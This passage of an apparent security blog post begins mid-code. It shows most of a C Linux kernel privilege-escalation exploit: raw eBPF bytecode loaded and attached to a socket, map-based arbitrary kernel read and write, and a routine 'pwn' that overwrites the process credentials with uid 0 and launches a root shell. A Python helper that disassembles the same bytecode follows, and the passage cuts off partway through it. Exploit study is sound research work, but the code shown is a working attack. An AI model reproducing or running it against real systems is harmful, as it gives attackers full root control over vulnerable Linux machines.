<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x18\x19\x00\x00\x03\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x06\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x07\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x02\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x08\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xbf\x02\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x06\x03\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x79\x73\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x7b\x32\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x55\x06\x02\x00\x01\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x7b\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x7b\x87\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="function"><span class="params">		  <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="function"><span class="params">		  <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.prog_type = prog_type,</span><br><span class="line">		.insns = (__u64)insns,</span><br><span class="line">		.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">		.license = (__u64)license,</span><br><span class="line">		.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">		.log_size = LOG_BUF_SIZE,</span><br><span class="line">		.log_level = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">	bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="function"><span class="params">		   <span class="keyword">int</span> max_entries)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_type = map_type,</span><br><span class="line">		.key_size = key_size,</span><br><span class="line">		.value_size = value_size,</span><br><span class="line">		.max_entries = max_entries</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)&amp;key,</span><br><span class="line">		.value = (__u64)&amp;value,</span><br><span class="line">		.flags = <span class="number">0</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)key,</span><br><span class="line">		.value = (__u64)value,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err) &#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"error: %s\n"</span>, err);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"mapfd finished"</span>);</span><br><span class="line">	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">			(struct bpf_insn *)__prog, PROGSIZE, <span class="string">"GPL"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"bpf_prog_load finished"</span>);</span><br><span class="line">	<span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"socketpair finished"</span>);</span><br><span class="line">	<span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"setsockopt finished"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"write"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"short write: %lu\n"</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line">	bpf_update_elem(<span class="number">0</span>, (a)); \</span><br><span class="line">	bpf_update_elem(<span class="number">1</span>, (b)); \</span><br><span class="line">	bpf_update_elem(<span class="number">2</span>, (c)); \</span><br><span class="line">	writemsg();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>) &#123;</span><br><span class="line">	__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr) &#123;</span><br><span class="line">	__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val) &#123;</span><br><span class="line">	__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64_t <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">	fp = __get_fp();</span><br><span class="line">	<span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus fp"</span>);</span><br><span class="line">	</span><br><span class="line">	sp = get_sp(fp);</span><br><span class="line">	<span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus sp"</span>);</span><br><span class="line">	</span><br><span class="line">	task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus task ptr"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"task_struct = %lx\n"</span>, task_struct);</span><br><span class="line"></span><br><span class="line">	credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus cred ptr"</span>);</span><br><span class="line"></span><br><span class="line">	uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line">	<span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">"bogus uid ptr"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"uidptr = %lx\n"</span>, uidptr);</span><br><span class="line">	__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"spawning root shell\n"</span>);</span><br><span class="line">		system(<span class="string">"id"</span>);</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__exit(<span class="string">"not vulnerable?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	prep();</span><br><span class="line">	pwn();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ebpf-tool"><a href="#ebpf-tool" class="headerlink" title="ebpf_tool"></a>ebpf_tool</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">opcode = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">	opcode.append(<span class="string">'invalid opcode'</span>)</span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">		"\xb4\x09\x00\x00\xff\xff\xff\xff"</span></span><br><span class="line"><span class="string">		"\x55\x09\x02\x00\xff\xff\xff\xff"</span></span><br><span class="line"><span class="string">		"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x18\x19\x00\x00\x03\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line"><span class="string">		"\x62\x0a\xfc\xff\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x79\x06\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line"><span class="string">		"\x62\x0a\xfc\xff\x01\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x79\x07\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xbf\x91\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x07\x02\x00\x00\xfc\xff\xff\xff"</span></span><br><span class="line"><span class="string">		"\x62\x0a\xfc\xff\x02\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x85\x00\x00\x00\x01\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x55\x00\x01\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x79\x08\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xbf\x02\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\xb7\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x55\x06\x03\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x79\x73\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x7b\x32\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x55\x06\x02\x00\x01\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x7b\xa2\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x7b\x87\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string">		"\x95\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">rules=<span class="string">'''</span></span><br><span class="line"><span class="string">	ALU_MOV_K(0,9,0x0,0xffffffff)</span></span><br><span class="line"><span class="string">	JMP_JNE_K(0,9,0x2,0xffffffff)</span></span><br><span class="line"><span class="string">	ALU64_MOV_K(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	JMP_EXIT(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	LD_IMM_DW(1,9,0x0,0x3)</span></span><br><span class="line"><span class="string">	padding</span></span><br><span class="line"><span class="string">	ALU64_MOV_X(9,1,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_MOV_X(10,2,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_ADD_K(0,2,0x0,0xfffffffc)</span></span><br><span class="line"><span class="string">	ST_MEM_W(0,10,0xfffc,0x0)</span></span><br><span class="line"><span class="string">	JMP_CALL(0,0,0x0,0x1)</span></span><br><span class="line"><span class="string">	JMP_JNE_K(0,0,0x1,0x0)</span></span><br><span class="line"><span class="string">	JMP_EXIT(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	LDX_MEM_DW(0,6,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_MOV_X(9,1,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_MOV_X(10,2,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_ADD_K(0,2,0x0,0xfffffffc)</span></span><br><span class="line"><span class="string">	ST_MEM_W(0,10,0xfffc,0x1)</span></span><br><span class="line"><span class="string">	JMP_CALL(0,0,0x0,0x1)</span></span><br><span class="line"><span class="string">	JMP_JNE_K(0,0,0x1,0x0)</span></span><br><span class="line"><span class="string">	JMP_EXIT(0,0,0x0,0x0)</span></span><br><span class="line"><span class="string">	LDX_MEM_DW(0,7,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_MOV_X(9,1,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_MOV_X(10,2,0x0,0x0)</span></span><br><span class="line"><span class="string">	ALU64_ADD_K(0,2,0x0,0xfffffffc)</span></span><br><span class="line"><span class="string">	ST_MEM_W(0,10,0xfffc,0x2)</span></span><br><span class="line"><span class="string">	JMP_CALL(0,0,0x0,0x1)</span></span><br><span class="line"><span class="string">	